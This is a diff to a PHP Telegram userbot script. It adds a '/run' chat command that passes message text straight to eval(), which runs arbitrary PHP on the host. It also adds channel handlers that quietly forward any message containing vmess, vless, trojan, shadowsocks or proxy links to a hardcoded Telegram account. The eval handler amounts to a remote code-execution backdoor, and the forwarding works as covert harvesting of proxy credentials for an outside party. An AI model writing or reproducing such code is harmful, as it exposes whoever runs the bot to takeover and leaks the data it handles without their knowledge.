@@ -207,13 +207,72 @@ if(preg_match("/^[\/\#\!]?(left) (.*)$/i", $msgOrig)){
     'message' => '❗️<code>'.$e->getMessage().'</code>',
     'parse_mode'=>'html',]);
 }}
+
+if (preg_match('/^[\/]?(run)\s?(.*)$/usi', $msgOrig, $match)) {
+$result   = null;
+$errors   = null;
+$match[2] = "return (function () use (&\$update,&\$TescoMsg,&\$peer,&\$message_id,&\$replyToId,&\$type,&\$message,&\$fromId){{$match[2]}})();";
+ob_start();
+try {
+(yield eval($match[2]));
+$result .= ob_get_contents() . "\n";
+} catch (\Throwable $e) {
+$run = $e->getMessage() . PHP_EOL . "Line :" . $e->getLine();
+} catch(\Exception $e) {
+$run = $e->getMessage() . PHP_EOL . "Line :" . $e->getLine();
+} catch(ParseError $e) {
+$run = $e->getMessage() . PHP_EOL . "Line :" . $e->getLine();
+} catch(FatalError $e) {
+$run = $e->getMessage() . PHP_EOL . "Line :" . $e->getLine();
+}
+ob_end_clean();
+if (empty($result)) {
+yield $this->messages->sendMessage([
+'peer'    => $peer,
+'message' => "No Results ...\nError:\n" . strip_tags($run) . "\n"
+]);
+return;
+}
+$errors = !empty($errors) ? "\nErrors :\n$errors" : null;
+$answer = "Results : \n" . $result . $errors;
+yield $this->messages->sendMessage([
+'peer'    => $peer,
+'message' => $answer,
+'parse_mode' => 'Markdown'
+]);
+}
 }
 
 if(isset($data['channel'][$chat_id])){
-if(strpos($msgOrig,"test") !== false){
+
+    if(strpos($msgOrig,"vmess:") !== false){
     yield $this->messages->sendMessage([
     'peer' => "5729039106", 
-    'message' => "r : $msgOrig",
+    'message' => "$msgOrig",
+    ]);
+    }
+    if(strpos($msgOrig,"vless:") !== false){
+    yield $this->messages->sendMessage([
+    'peer' => "5729039106", 
+    'message' => "$msgOrig",
+    ]);
+    }
+    if(strpos($msgOrig,"trojan:") !== false){
+    yield $this->messages->sendMessage([
+    'peer' => "5729039106", 
+    'message' => "$msgOrig",
+    ]);
+    }
+    if(strpos($msgOrig,"ss:") !== false){
+    yield $this->messages->sendMessage([
+    'peer' => "5729039106", 
+    'message' => "$msgOrig",
+    ]);
+    }
+    if(strpos($msgOrig,"proxy:") !== false){
+    yield $this->messages->sendMessage([
+    'peer' => "5729039106", 
+    'message' => "$msgOrig",
     ]);
     }
 }
